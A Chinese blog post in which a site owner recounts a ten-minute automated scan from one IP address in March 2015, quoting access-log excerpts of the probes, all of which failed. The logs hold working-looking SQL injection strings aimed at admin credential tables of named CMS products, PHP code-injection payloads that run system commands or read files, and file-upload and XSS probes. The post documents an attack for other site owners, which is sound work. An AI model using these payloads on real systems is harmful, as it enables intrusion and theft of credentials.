@@ -1,0 +1,184 @@
+---
+layout: post
+title:  "被183.60.243.234攻击记"
+date:    2015-3-5 20:03:56 +0800
+categories: 技术
+---
+第一条request是
+
+    183.60.243.234 [05/Mar/2015:17:57:55 +0800] / 200 1.537 1.537 0 
+
+最后一条request是
+
+    183.60.243.234 [05/Mar/2015:18:08:07 +0800] /ascii_art/text/ 403 0.002 0.002 1006
+
+差不多就10分钟吧，一共3814个request
+
+网上搜了下，这个IP应该是惯犯
+
+[2014年11月20日，晚间8点30分，网站遭遇到IP地址为 183.60.243.234 （经查，该IP号码为惯犯，提醒各位站长将其列入黑名单）的恶意CC攻击，导致网站拓机12小时之久。软件有料第一时间向广东广州网警报案，并停止域名解析。](http://www.appimm.com/about/)
+
+[就关于本站12年12月7日受到的攻击已报案 蟹蟹牛童装官网 / 2014-01-26](http://www.crabox.com/article-251.html)
+
+[就关于本站14年6月9日受到的攻击已报案](http://blog.itunic.com/ddos-baoan.html)
+
+[大神别处练手，小站不想折腾——再记伪黑客作死](http://aikongke.com/3579.html)
+
+大概看了下log，还是比较有趣的
+
+<!--more-->
+
+比如下面这些log
+
+    # 这堆php是什么鬼。。。各种sql尝试注入。。。。奇怪的php注入
+      183.60.243.234 [05/Mar/2015:18:01:15 +0800] /tool//yb/yb.php?q=${@die(print(md5(0.573354965313)))} 404 0.007 0.007 4477 
+      183.60.243.234 [05/Mar/2015:18:01:07 +0800] /xheditor/upload.php 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:01:05 +0800] /user/demos/upload.php 404 0.014 0.014 4477 
+      183.60.243.234 [05/Mar/2015:18:01:04 +0800] /admin/demos/upload.php 404 0.019 0.019 4477 
+      183.60.243.234 [05/Mar/2015:18:01:03 +0800] /editor/demos/upload.php 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:01:00 +0800] /xheditor/demos/upload.php 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:01:00 +0800] /index.php?mod=product&act=list&keyword=pw%'%20UNION%20SELECT%201,concat(0x7e,user(),0x7e),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19%23 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:01:00 +0800] /admin/editor/demos/upload.php 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:59 +0800] /user/xheditor/demos/upload.php 404 0.016 0.016 4477 
+      183.60.243.234 [05/Mar/2015:18:00:56 +0800] /connect.php?receive=yes&mod=login&op=callback&referer=xyz%bf\x5Cu0027.replace(/.%2b/,/javascript:alert(511265478)/.source);// 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:56 +0800] /index.php?view=../admin/Sources/edit_loginad&edit=-1%20union%20select%201,2,3,4,%28SELECT%20md5(3.1416)%20FROM%20admin%29,6,7,8,9--%20- 404 0.018 0.018 4477 
+      183.60.243.234 [05/Mar/2015:18:00:56 +0800] /index.php?mod=product&act=list&keyword=pw%'%20UNION%20SELECT%201,(select+concat(0x7e,admin_name,0x40,admin_pw,0x7e)+from+pe_admin),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19%23 404 0.017 0.017 4477 
+      183.60.243.234 [05/Mar/2015:18:00:56 +0800] /fck/editor/filemanager/upload/php/upload.php?Type=Media 404 0.019 0.019 4477 
+      183.60.243.234 [05/Mar/2015:18:00:56 +0800] /member.php?act=check_info_gold&table=phpmps_member%20where%201=1%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%28select%20password%20from%20phpmps_admin%20limit%200,1%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23 404 0.018 0.018 4477 
+      183.60.243.234 [05/Mar/2015:18:00:56 +0800] /flash_upload.php?modelid=1%20and%20(SELECT%201%20FROM%20(select%20count(*),concat(floor(rand(0)*2),(SELECT%20concat(0x7e,0x7e,username,0x7e,0x7e,password,0x7e,0x7e)%20from%20phpcms_member%20limit%201))a%20from%20information_schema.tables%20group%20by%20a)b) 404 0.016 0.016 4477 
+      183.60.243.234 [05/Mar/2015:18:00:56 +0800] /demos/upload.php 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:56 +0800] /yp/product.php?pagesize={${print(md5(0.0389157973565))}} 404 0.012 0.012 4477 
+      183.60.243.234 [05/Mar/2015:18:00:54 +0800] /huangou.php?id=1/**/and/**/1=2/**/union/**/select/**/0,1,2,3,md5(7758520),5,6,7 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:54 +0800] /common/lib/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media 404 0.016 0.016 4477 
+      183.60.243.234 [05/Mar/2015:18:00:54 +0800] /index.php?_m=mod_user&_a=do_reg 404 0.013 0.013 4477 
+    
+      183.60.243.234 [05/Mar/2015:18:00:54 +0800] /index.php?_m=mod_user&_a=do_reg 404 0.013 0.013 4477 
+      183.60.243.234 [05/Mar/2015:18:00:54 +0800] /fck/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/ 404 0.011 0.011 4477 
+      183.60.243.234 [05/Mar/2015:18:00:54 +0800] /fckeditor/editor/filemanager/upload/php/upload.php?Type=Media 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:54 +0800] /pwwiki/pmwiki.php 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /huangou.php?id=1/**/and/**/1=2/**/ununionion/**/seselectlect/**/0,1,2,3,md5(7758520),5,6,7 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /suggestwordList.php?searchWord=1&language=-5178%20OR%20%28SELECT%209505%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716c736571%2C%28SELECT%20MID%28%28IFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%203%2C1%29%2C0x7177707971%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 404 0.183 0.183 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /api.php 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /index.php?option=com_fss&view=test&prodid=777777.7'+union+all+select+77777777777777%2c77777777777777%2c77777777777777%2cconcat(0x3a3b3c3d3d3c3b3a%2cdatabase()%2c0x3a3b3c3d3d3c3b3a)%2c77777777777777%2c77777777777777%2c77777777777777%2c77777777777777%2c77777777777777%2c77777777777777%2c77777777777777--+D4NB4R%26limitstart%3d0 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /xmlrpc.php 404 0.014 0.014 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /pmwiki.php 404 0.011 0.011 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /api/uc.php?code=5b8flJX%2Bxy1Cv97XmC6LHcjkTOAcdGIA0HhH04grt95Uh6TJ0Y0zIyqmyvfmITeL%2F47YRoPLqItWV1DhjdywkJRjpD0hg4edjdvHridVFZpq12xX%2BC8k8iPpJ1HVJQ 404 0.010 0.010 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /wp-content/themes/linenity/functions/download.php?imgurl=theme-functions.php&name=theme-functions.php 404 0.013 0.013 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/ 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:53 +0800] /dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=dompdf.php 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /index.php?case=archive&act=orders 404 0.010 0.010 4477 
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /plus/download.php?id=1&open=2&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=95&arrs2[]=97&arrs2[]=114&arrs2[]=99&arrs2[]=116&arrs2[]=105&arrs2[]=110&arrs2[]=121&arrs2[]=32&arrs2[]=117&arrs2[]=110&arrs2[]=105&arrs2[]=111&arrs2[]=110&arrs2[]=32&arrs2[]=115&arrs2[]=101&arrs2[]=108&arrs2[]=101&arrs2[]=99&arrs2[]=116&arrs2[]=32&arrs2[]=49&arrs2[]=44&arrs2[]=50&arrs2[]=35 404 0.011 0.011 4477 
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}} 404 0.010 0.010 4477 
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /admin/Lib/Action/noadmin.class.php?action=b78a0164cbef4b513aaae59653f525dd&a=0f5264038205edfb1ac05fbb0e8c5e94 404 0.014 0.014 4477 
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /index.php?m=brand&s=detail&id=test'+and+(select+1+from+(select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a);%23 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /huangou.php?id=1/**/and/**/1=2/**/union/**/select/**/0,1,2,adminname,adminpass,5,6,7/**/from/**/duoduo_duoduo2010 404 0.008 0.008 4477 
+    
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /index.php 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=dompdf.php 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /index.php?user-space-1/**/and/**/1=(updatexml(1,concat(0x5e24,(select/**/user()),0x5e24),1)) 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:52 +0800] /announce/announce.php 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /index.php/tools-staticPage.html?filename=../../../robots.txt 404 0.013 0.013 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /reg.php?F_lang= 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /dompdf.php?input_file=./dompdf.php 404 0.011 0.011 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /file/editor.php 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:49 +0800] /api.php 404 0.011 0.011 4477 
+      183.60.243.234 [05/Mar/2015:18:00:49 +0800] /dompdf/dompdf.php?input_file=./dompdf.php 404 0.029 0.029 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /wap.php?action=list&id=392%20test 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:49 +0800] /index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))} 404 0.013 0.013 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /huangou.php?id=1/**/and/**/1=2/**/ununionion/**/seselectlect/**/0,1,2,adminname,adminpass,5,6,7/**/from/**/duoduo_duoduo2010 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /the_file_that_should_never_exist_on_server.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42 404 0.259 0.259 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /plus/download.php?id=1&open=2 404 0.258 0.258 4477 
+      183.60.243.234 [05/Mar/2015:18:00:49 +0800] /file/swfupload/editor.php 404 0.020 0.020 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))} 404 0.014 0.014 4477 
+      183.60.243.234 [05/Mar/2015:18:00:49 +0800] /index.php?user-space-1/**/and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x5E24,username,0x3A,password,0x245E)/**/from/**/wiki_user/**/where/**/groupid=4/**/limit/**/0,1))/**/from/**/wiki_doc/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/wiki_doc/**/group/**/by/**/x)a)/**/and/**/1=1 404 0.016 0.016 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /index.php/weblinks-categories?id=0%20)%20and%20(select%201%20from%20%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a);%23 404 0.247 0.247 4477 
+      183.60.243.234 [05/Mar/2015:18:00:50 +0800] /index.php?a=saveAvatar&m=Uc&g=Home&id=1&photoServer=19ab43298ff724ce4fa9f974dd3dfeec.php&type=big 404 0.008 0.008 4477 
+    
+    
+    # 还有这堆asp
+     183.60.243.234 [05/Mar/2015:18:00:41 +0800] /HXINCLUDE/Admin_Upfile.asp 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:38 +0800] /Search/SearchList.aspx?keyword=1&node=0/**/and/**/db_name()>0 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:36 +0800] /siteserver/cms/console_logSite.aspx?UserName=txexsxt%27+and+1%3D%28select+top+1+char%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28110%29%2Bchar%2895%29%2Bchar%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28115%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28118%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%2895%29%2Bchar%2851%29%2Bchar%2849%29%2Bchar%2855%29%2Bchar%2856%29%2Bchar%2850%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BUsername%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BPassword%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28104%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28101%29+from+%5Bbairong_Administrator%5D%29%29%29+AS+t0--&PublishmentSystemID=0&Keyword=&DateTo=&DateFrom=&LogType=ALL 404 0.010 0.010 4477 
+      183.60.243.234 [05/Mar/2015:18:00:35 +0800] /siteserver/cms/modal_contentTagAdd.aspx?PublishmentSystemID=-1&TagName=-1%27+and+1%3D%28select+top+1+char%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28110%29%2Bchar%2895%29%2Bchar%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28115%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28118%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%2895%29%2Bchar%2851%29%2Bchar%2849%29%2Bchar%2855%29%2Bchar%2856%29%2Bchar%2850%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BUsername%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BPassword%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28104%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28101%29+from+%5Bbairong_Administrator%5D%29--+ 404 0.012 0.012 4477 
+      183.60.243.234 [05/Mar/2015:18:00:35 +0800] /Plus/Promotion.asp 404 0.010 0.010 4477 
+      183.60.243.234 [05/Mar/2015:18:00:34 +0800] /siteserver/userRole/background_user.aspx?AreaID=0&PageNum=0&Keyword=txexsxt%27+and+1%3D%28select+top+1+char%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28110%29%2Bchar%2895%29%2Bchar%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28115%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28118%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%2895%29%2Bchar%2851%29%2Bchar%2849%29%2Bchar%2855%29%2Bchar%2856%29%2Bchar%2850%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BUsername%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BPassword%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28104%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28101%29+from+%5Bbairong_Administrator%5D%29%29%29+AS+t0--+&CreateDate=0&LastActivityDate=0&DepartmentID=0&TypeIP=0 404 0.013 0.013 4477 
+      183.60.243.234 [05/Mar/2015:18:00:33 +0800] /siteserver/bbs/background_thread.aspx?UserName=0&DateTo=&ForumID=0&DateFrom=&Title=test%27+and+1%3D%28select+top+1+char%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28110%29%2Bchar%2895%29%2Bchar%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28115%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28118%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%2895%29%2Bchar%2851%29%2Bchar%2849%29%2Bchar%2855%29%2Bchar%2856%29%2Bchar%2850%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BUsername%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BPassword%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28104%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28101%29+from+%5Bbairong_Administrator%5D%29+and+%271%25%27%3D%271 404 0.007 0.007 4477 
+      183.60.243.234 [05/Mar/2015:18:00:33 +0800] /MockLogin.aspx 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:33 +0800] /Plugins/Doc.aspx?id=1/**/and/**/1=2 404 0.301 0.301 4477 
+      183.60.243.234 [05/Mar/2015:18:00:34 +0800] /siteserver/bbs/background_keywordsFilting.aspx?grade=0&categoryid=0&keyword=test%27+and+1%3D%28select+top+1+char%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28110%29%2Bchar%2895%29%2Bchar%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28115%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28118%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%2895%29%2Bchar%2851%29%2Bchar%2849%29%2Bchar%2855%29%2Bchar%2856%29%2Bchar%2850%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BUsername%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BPassword%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28104%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28101%29+from+%5Bbairong_Administrator%5D%29+and+%27%25%27%3D%27 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:33 +0800] /siteserver/cms/background_fileTree.aspx?PublishmentSystemID=0&RootPath=&CurrentRootPath=include 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:30 +0800] /siteserver/cms/background_contentsGroup.aspx?publishmentSystemID=1&contentGroupName=2111%27%29+and+1%3D%28select+top+1+char%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28110%29%2Bchar%2895%29%2Bchar%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28115%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28118%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%2895%29%2Bchar%2851%29%2Bchar%2849%29%2Bchar%2855%29%2Bchar%2856%29%2Bchar%2850%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BUsername%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BPassword%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28104%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28101%29+from+%5Bbairong_Administrator%5D%29%29+as+t0-- 404 0.014 0.014 4477 
+      183.60.243.234 [05/Mar/2015:18:00:30 +0800] /Plugins/Doc.aspx?id=1/**/and/**/1=1 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:26 +0800] /siteserver/bbs/background_user.aspx?PageNum=0&Keyword=test%27+and+1%3D%28select+top+1+char%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28105%29%2Bchar%28110%29%2Bchar%2895%29%2Bchar%28116%29%2Bchar%28104%29%2Bchar%28105%29%2Bchar%28115%29%2Bchar%2895%29%2Bchar%28115%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28118%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%2895%29%2Bchar%2851%29%2Bchar%2849%29%2Bchar%2855%29%2Bchar%2856%29%2Bchar%2850%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BUsername%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2B%5BPassword%5D%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2845%29%2Bchar%2857%29%2Bchar%2856%29%2Bchar%2855%29%2Bchar%2854%29%2Bchar%2895%29%2Bchar%28110%29%2Bchar%28111%29%2Bchar%2895%29%2Bchar%28104%29%2Bchar%28101%29%2Bchar%28114%29%2Bchar%28101%29+from+%5Bbairong_Administrator%5D%29%29%29+as+t0--&UserGroup=7 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:25 +0800] /018d661ab998853079be32758a51a286.asp 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:18:00:26 +0800] /logins.asp 404 0.012 0.012 4477 
+      183.60.243.234 [05/Mar/2015:18:00:25 +0800] /fck/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=/ 404 0.007 0.007 4477 
+      183.60.243.234 [05/Mar/2015:18:00:25 +0800] /admin/SysAdmin_list.asp 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:18:00:25 +0800] /site/default.asp?TroncoID=%27UNION%20SELECT%201%20FROM%20thisisfaketable.FakeTable 404 0.007 0.007 4477 
+      183.60.243.234 [05/Mar/2015:18:00:24 +0800] /inc/AspCms_Visits.asp?id=1%20anexecd%201=2%20union%20selecountct%20%20top%201%200x7e%2b0x7e%2b0x7e%2bLoginName%2b0x7c%2b0x7c%2b0x7c%2bpassword%2b0x7e%2b0x7e%2b0x7e%20from%20{prefix}user 404 0.008 0.008 4477 
+    # jsp也有 别抢。。。
+
+      183.60.243.234 [05/Mar/2015:17:59:40 +0800] /civitas/district_output/tz.jsp 404 0.012 0.012 4477 
+      183.60.243.234 [05/Mar/2015:17:59:37 +0800] /civitas/district_output/jspcheck.jsp 404 0.017 0.017 4477 
+      183.60.243.234 [05/Mar/2015:17:59:27 +0800] /blog/post/tz.jsp 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:17:59:27 +0800] /civitas/district/tz.jsp 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:17:59:27 +0800] /civitas/district/jspcheck.jsp 404 0.012 0.012 4477 
+      183.60.243.234 [05/Mar/2015:17:59:27 +0800] /accounts/register/tz.jsp 404 0.013 0.013 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /ascii_art/tz.jsp 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /ascii_art/img/tz.jsp 404 0.012 0.012 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /accounts/register/jspcheck.jsp 404 0.010 0.010 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /ascii_art/text/tz.jsp 404 0.012 0.012 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /blog/post/jspcheck.jsp 404 0.018 0.018 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /accounts/reset_password/tz.jsp 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /blog/tag/tz.jsp 404 0.013 0.013 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /accounts/login/tz.jsp 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /blog/type/tz.jsp 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /accounts/reset_password/jspcheck.jsp 404 0.009 0.009 4477 
